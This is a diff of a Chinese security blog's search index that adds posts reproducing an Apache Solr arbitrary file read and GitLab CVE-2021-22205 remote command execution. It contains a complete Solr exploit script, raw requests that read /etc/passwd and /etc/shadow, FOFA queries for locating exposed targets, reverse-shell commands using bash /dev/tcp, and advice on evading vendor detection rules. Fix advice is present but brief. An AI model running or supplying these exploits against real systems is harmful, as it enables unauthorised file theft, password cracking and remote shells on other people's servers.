@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>1039家校通SQL注入和后台GETSHELL</title>
+    <title>【1039家校通】SQL注入和后台GETSHELL</title>
     <url>/2021/01/25/1039%E5%AE%B6%E6%A0%A1%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%92%8C%E5%90%8E%E5%8F%B0GETSHELL/</url>
     <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1039家校通网上约车系统是一款驾校一体化系统。其目录中有多个上传点存在sql注入，还存在任意文件上传导致getshell。因为是比较老的漏洞，下面就直接展示挖掘过程了。</p>
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>家校通v1.0 - v.6.0</p>
@@ -30,6 +30,173 @@
       </categories>
       <tags>
         <tag>2014.7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【Apache】Apache Solr任意文件读取漏洞复现</title>
+    <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr 全版本存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标系统的敏感文件。</p>
+<p>我综合了网上的两种漏洞利用，写了一篇比较详尽的文章。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Solr 全版本</p>
+<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>感谢PeiQi师傅，yyds！</p>
+<pre class="line-numbers language-none"><code class="language-none"># coding&#x3D;utf-8
+# Apache Solr 全版本任意文件读取
+# Fofa：app&#x3D;&quot;Apache-Solr&quot; || app&#x3D;&quot;Solr&quot;
+
+import requests
+import json
+import sys
+import time
+
+def title():
+    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
+    print(&quot;+～～～～～～ Apache Solr 全版本任意文件读取 ～～～～～～+&quot;)
+    print(&quot;+～～～～～～     Use: python3 solr.py     ～～～～～～+&quot;)
+    print(&quot;+～～～～～～   url: http:&#x2F;&#x2F;x.x.x.x:port   ～～～～～～+&quot;)
+    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
+    time.sleep(2)
+
+def get_name(url):
+    url_1 &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;
+    try:
+        res &#x3D; requests.get(url&#x3D;url_1)
+        #将json数据python字典话
+        name &#x3D; str(list(json.loads(res.text)[&quot;status&quot;])[0])
+        print(&quot;[!]  获取到目标系统name:\033[31m%s\033[0m&quot;%name+&quot;  [0]&quot;+&quot;URL:&quot;+url+&quot;&#x2F;solr&#x2F;&quot;+name+&quot;&#x2F;config&quot;)
+        return name
+    except Exception as e:
+        print(&quot;[!]  目标URL无法进行利用。&quot;,e)
+        sys.exit(0)
+
+def check_vul(url,name):
+    url_2 &#x3D; url +&quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;config&quot;
+    data &#x3D; &#39;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39;
+
+    try:
+        res &#x3D; requests.post(url&#x3D;url_2,data&#x3D;data)
+        if &quot;This response format&quot; in res.text and res.status_code &#x3D;&#x3D; 200:
+            print(&quot;[!]  \033[31m目标系统存在漏洞\033[0m&quot;)
+        else:
+            print(&quot;[!]  目标系统不存在漏洞&quot;)
+            sys.exit(0)
+    except Exception as e:
+        print(&quot;[!]  目标系统请求失败。&quot;)
+        sys.exit(0)
+
+def read_files(url,name,file_name):
+    url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot;
+    # 此处必须要加content-type,否则读取不到文件
+    headers &#x3D; &#123;
+        &quot;Content-Type&quot; : &quot;application&#x2F;x-www-form-urlencoded&quot;
+    &#125;
+    data &#x3D; &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#123;&#125;&quot;.format(file_name)
+
+    try:
+        res &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;data)
+        if &quot;No such file or directory&quot; in res.text:
+            print(&quot;[!] 目标系统读取文件失败！&quot;)
+            sys.exit(0)
+        else:
+            print(&quot;正在读取文件..........&quot;)
+            content &#x3D; (json.loads(res.text)[&quot;streams&quot;][0][&quot;stream&quot;])
+            print(&quot;[o] 读取文件内容为：\n\033[34m&#123;&#125;\033\0m&quot;.format(content))
+    except Exception as e:
+        print(&quot;[!]  目标系统似乎意外中断了&quot;,e)
+        sys.exit(0)
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    title()
+    url &#x3D; str(input(&quot;\n[!]  请输入目标系统URL: &quot;))
+    name &#x3D; get_name(url)
+    check_vul(url,name)
+    file_name &#x3D; str(input(&quot;[!]  请输入要读取的文件：&quot;))
+    read_files(url,name,file_name)
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>复现环境使用了Apache Solr 8.8.1版本，搭建在kali2021虚拟机上<br><a href="https://archive.apache.org/dist/lucene/solr/8.8.1/">https://archive.apache.org/dist/lucene/solr/8.8.1/</a><br><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>解压后，进入bin目录执行启动命令</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr strat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>访问url,出现如下页面即为启动成功<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>此时启动的solr是没有核心进行索引和搜索的，这里需要创建一个数据驱动模式的核心</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr create -c [name]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit①"><a href="#Exploit①" class="headerlink" title="Exploit①"></a>Exploit①</h4><p>访问url</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>burp数据包为</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age&#x3D;0
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>再使用burp进行POST请求</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Connection: close
+Content-Length: 82
+
+&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>当出现”This response format is experimental.  It is likely to change in the future.” 表示存在漏洞。</p>
+<p>进行文件读取</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Connection: close
+Content-Length: 35
+Content-Type: application&#x2F;x-www-form-urlencoded
+
+stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>也可以读取shadow文件然后进行john爆破出密码</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Connection: close
+Content-Length: 35
+Content-Type: application&#x2F;x-www-form-urlencoded
+
+stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"></p>
+<h4 id="Exploit②"><a href="#Exploit②" class="headerlink" title="Exploit②"></a>Exploit②</h4><pre class="line-numbers language-none"><code class="language-none">curl -d &#39;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39; http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;config -H &#39;Content-type:application&#x2F;json&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"></p>
+<pre class="line-numbers language-none"><code class="language-none">curl &quot;http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot; -F &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;root&#x2F;a.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以读取被攻击的主机文件<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
+<h4 id="Exploit-POC"><a href="#Exploit-POC" class="headerlink" title="Exploit_POC"></a>Exploit_POC</h4><p><a href="https://github.com/Henry4E36/Solr">https://github.com/Henry4E36/Solr</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>由于目前官方不予修复该漏洞，暂无安全版本。</p>
+<ol>
+<li>开启身份验证/授权</li>
+<li>配置防火墙策略，确保Solr API（包括Admin UI）只有受信任的IP和用户才能访问</li>
+<li>禁止将Apache Solr放置在外网</li>
+</ol>
+<h3 id="厂商防护及绕过思路"><a href="#厂商防护及绕过思路" class="headerlink" title="厂商防护及绕过思路"></a>厂商防护及绕过思路</h3><p>这种组件直接放内网就好了，或者一定配置身份校验，且Solr路由写的比较死，厂商提取规则时只要将url过滤完整即可，不会存在绕过情况。</p>
+<p>绕过的话，虽然说每个漏洞url较为固定，但是每个功能的触发点皆为每个core或collection，core的名称包含在url中，且生产环境中为用户自定义，很多规则编写者通常只将示例example加入检测，可绕过几率很高。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ">https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ</a><br><a href="https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg">https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg</a><br><a href="https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw">https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.1</tag>
       </tags>
   </entry>
   <entry>
@@ -92,6 +259,42 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
       </tags>
   </entry>
   <entry>
+    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
+    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
+app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
+<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
+<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
+<pre class="line-numbers language-none"><code class="language-none">反弹shell：
+
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，对写入成功的sh脚本加执行权限
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
+<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
+<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.11</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【CVE-2021-23132】Joomla!目录遍历及远程代码执行漏洞复现</title>
     <url>/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Joomla&quot;
@@ -99,7 +302,7 @@ app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hid
 <h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，是全球知名的一套内容管理系统（CMS）。<br>本漏洞涉及到目录遍历及进一步导致的RCE漏洞。在Joomla! 3.0.0到3.9.24版本中，Joomla!的com_media组件配置允许被任意修改导致Web级别目录遍历，攻击者通过一系列操作，进一步会导致远程命令执行。</p>
 <h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N<br>漏洞等级：7.5 | 高危</p>
 <h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>3.0.0 &lt;= Joomla! &lt;= 3.9.24</p>
-<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p><a href="https://github.com/HoangKien1020/CVE-2021-23132">https://github.com/HoangKien1020/CVE-2021-23132</a></p>
+<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/HoangKien1020/CVE-2021-23132">https://github.com/HoangKien1020/CVE-2021-23132</a></p>
 <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本次漏洞复现环境在本地搭建，首先从<a href="https://downloads.joomla.org/zh-cn/">官网</a>下载安装包，我这里使用了Joomla_3.9.22模板。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>直接在php集成环境下安装即可，附上<a href="https://www.bilibili.com/video/BV1Mt411A7V4?p=7">B站链接</a>。<br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br><img src="/images/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"><br>Joomla！在安装过程中会提示新建超级管理员，当然，在该超级管理员权限下是可以直接getshell的，因为权限很大。<br>该漏洞是在一般普通管理员的身份下，存在网站目录下的任意文件目录遍历，而导致的远程代码执行漏洞。所以该漏洞的利用前提需要有一个普通管理员的权限。</p>
